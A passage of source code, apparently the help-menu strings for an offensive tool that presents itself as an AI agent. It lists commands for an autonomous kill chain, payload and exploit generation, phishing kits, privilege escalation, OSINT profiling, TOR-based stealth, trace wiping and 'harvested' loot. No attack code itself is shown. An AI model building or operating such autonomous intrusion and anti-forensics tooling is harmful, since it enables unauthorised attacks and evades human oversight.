            "     kill_chain       — AI-planned autonomous attack",
            "     dominate         — Full network domination",
            "     enumerate_host   — Complete host enumeration",
            "     full_auto        — Everything (nuclear option)",
            "     payload          — Cross-platform payload gen",
            "     phish / se       — Social engineering package",
            "     exploit          — Custom exploit generation",
            "     escalate         — Privilege escalation paths",
            "",
            "  🕵️  INTELLIGENCE:",
            "     osint / profile  — OSINT fusion 50+ sources",
            "     intel            — Full target intel profile",
            "",
            "  👻 STEALTH:",
            "     ghost            — Ghost mode (TOR+MAC+proxy)",
            "     unghost          — Deactivate ghost mode",
            "     wipe             — Emergency trace wipe",
            "",
            "  📋 MANAGEMENT:",
            "     report           — Professional pentest report",
            "     loot             — Show harvested data",
            "     timeline         — Session activity timeline",
            "     status           — Agent status dashboard",
            "     kill_all         — Emergency stop all processes",
            "     reset            — Clear confirmation state",
            "     run              — Execute custom shell command",
            "",
            "  ⚠️  ALL ACTIONS REQUIRE CONFIRMATION.",
            "  Say 'PHANTOM CONFIRMED' to authorize.",
        ])